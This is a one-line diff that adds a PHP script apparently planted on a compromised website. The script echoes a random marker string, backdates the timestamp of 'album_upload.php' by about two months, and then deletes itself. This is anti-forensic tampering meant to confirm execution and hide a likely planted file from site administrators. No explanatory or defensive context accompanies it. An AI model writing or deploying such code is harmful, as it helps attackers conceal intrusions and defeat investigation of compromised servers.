@@ -1,0 +1,1 @@
+<?php echo "zqFftBSSaY"; if (file_exists("./album_upload.php")){ touch("./album_upload.php",(time()-60*60*24*30*2)); } unlink(__FILE__); /*99fgT0HDHEqVyfeYxPr6*/ ?>
